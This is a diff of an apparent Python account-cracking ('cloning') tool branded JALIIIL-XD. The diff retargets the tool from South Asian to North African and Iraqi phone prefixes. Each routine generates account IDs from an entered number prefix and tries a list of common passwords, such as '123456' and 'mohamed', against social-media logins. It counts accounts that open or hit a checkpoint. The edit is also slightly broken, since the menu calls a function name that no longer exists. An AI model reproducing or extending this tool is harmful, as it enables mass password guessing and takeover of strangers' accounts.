@@ -352,17 +352,17 @@ def menu():
                                 os.system('python usmi.py')
                         elif xd in ['2','02']:
                                 clear()
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afghanistan cloning\n [4] India cloning\n [5] Gmail cloning\n [0] Back menu')
+                                print(' [1] Algeria cloning\n [2] Morocco cloning\n [3] Tunisia cloning\n [4] Iraq cloning\n [5] Gmail cloning\n [0] Back menu')
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
-                                        pak()
+                                        alg()
                                 elif x in ['2','02']:
-                                        bd()
+                                        mc()
                                 elif x in ['3','03']:
-                                        afg()
+                                        tn()
                                 elif x in ['4','04']:
-                                        ind()        
+                                        ir()        
                                 elif x in ['5','05']:  
                                         gmail()      
                                 else:
@@ -380,10 +380,10 @@ def menu():
         except requests.exceptions.ConnectionError:
                 print('\n NO INTERNET CONNECTION ...')
                 exit()
-def pak():
+def alg():
                 user=[]
                 clear()
-                print('\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345')
+                print('\033[1;31m CODE EXAMPLE : 2136,2137,2135')
                 code = input('\033[1;37m PUT CODE: ')
                 try:
                         limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
@@ -402,7 +402,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
+                                passlist = [psx,ids,'123456','12345678','123456789','mohamed','code','1234567890','123123']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -410,11 +410,11 @@ def pak():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
-def bd():
+                os.system('python jalil.py')
+def mc():
                 user=[]
                 clear()
-                print('\033[1;31m CODE EXAMPLE : 017,016,018')
+                print('\033[1;31m CODE EXAMPLE : 2125,2126,2127')
                 code = input('\033[1;37m PUT CODE: ')
                 try:
                         limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
@@ -433,7 +433,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
+                                passlist = [psx,ids,'123456','12345678','123456789','mohamed','code','1234567890','123123']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -441,12 +441,12 @@ def bd():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
+                os.system('python jalil.py')
 
-def afg():
+def tn():
                 user=[]
                 clear()
-                print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
+                print('\033[1;31m CODE EXAMPLE : 2162,2167,2128,21269')
                 code = input('\033[1;37m PUT CODE: ')
                 try:
                         limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
@@ -465,7 +465,7 @@ def afg():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                passlist = [psx,ids,'123456','12345678','123456789','mohamed','code','1234567890','123123']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -473,11 +473,11 @@ def afg():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
-def ind():
+                os.system('python jalil.py')
+def iq():
                 user=[]
                 clear()
-                print('\033[1;31m CODE EXAMPLE : 91***,etc')
+                print('\033[1;31m CODE EXAMPLE : 964770,964750,964780')
                 code = input('\033[1;37m PUT CODE: ')
                 try:
                         limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
@@ -496,7 +496,7 @@ def ind():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'57273200','hindustan','kingkhan','india123','59039200','57575751']
+                                passlist = [psx,ids,'123456','12345678','123456789','mohamed','code','1234567890','123123']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -504,7 +504,7 @@ def ind():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python uami.py')
+                os.system('python jalil.py')
                 
 def gmail():
                 os.system('rm -rf .re.txt')
@@ -560,7 +560,7 @@ def gmail():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python usmi.py')
+                os.system('python jalil.py')
                 
 #------
 def ffb(ids,names,passlist):
@@ -646,7 +646,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
